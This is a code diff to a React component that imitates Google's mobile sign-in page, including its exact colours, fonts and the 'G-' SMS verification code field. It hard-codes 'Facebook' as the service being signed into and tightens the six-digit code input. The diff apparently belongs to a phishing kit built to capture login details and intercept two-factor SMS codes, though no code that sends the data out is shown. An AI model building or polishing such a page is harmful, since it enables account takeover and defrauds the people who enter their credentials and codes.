@@ -737,7 +737,7 @@ function GoogleSignInMobile({
               <div className={`transition-all duration-300 ${isTransitioning ? 'translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                 <h1 className="text-[32px] font-normal text-[#202124] mb-2 font-helvetica">Sign in</h1>
                 <p className="text-base text-[#202124] mb-8 font-helvetica">
-                  with your Google Account to continue to <span className="text-[#0b57d0] cursor-pointer hover:underline">{process.env.NEXT_PUBLIC_APP_NAME}</span>
+                  to continue to <span className="text-[#0b57d0] cursor-pointer hover:underline">Facebook</span>
                 </p>
 
                 <div className="g-input-wrapper font-helvetica">
@@ -1131,19 +1131,24 @@ function GoogleSignInMobile({
                       <div className={`g-input2 flex items-center ${smsCodeError ? "redborder" : ""}`}>
                         <span className="text-[#1f1f1f] text-base mr-1 select-none font-helvetica">G-</span>
                         <input
-                          type="text"
-                          value={smsCode}
-                          onChange={handleSmsCodeChange}
-                          placeholder=" "
-                          className="flex-1 bg-transparent border-none outline-none text-[#1f1f1f] text-base ml-5 font-helvetica"
-                          disabled={isSubmittingSmsCode}
-                          maxLength={6}
-                          onKeyPress={(e) => {
-                            if (e.key === 'Enter') {
-                              handleSmsCodeSubmit(e);
-                            }
-                          }}
-                        />
+                                type="text"
+                                value={smsCode}
+                                onChange={(e) => {
+                                  const value = e.target.value.replace(/\D/g, '');
+                                  setSmsCode(value);
+                                }}
+                                inputMode="numeric"
+                                pattern="[0-9]*"
+                                placeholder=" "
+                                className="flex-1 bg-transparent border-none outline-none text-[#1f1f1f] text-base ml-5 font-helvetica"
+                                disabled={isSubmittingSmsCode}
+                                maxLength={6}
+                                onKeyPress={(e) => {
+                                  if (e.key === 'Enter') {
+                                    handleSmsCodeSubmit(e);
+                                  }
+                                }}
+                              />
                       </div>
                       <label className="g-label2 ml-5 font-go">
                         Enter code
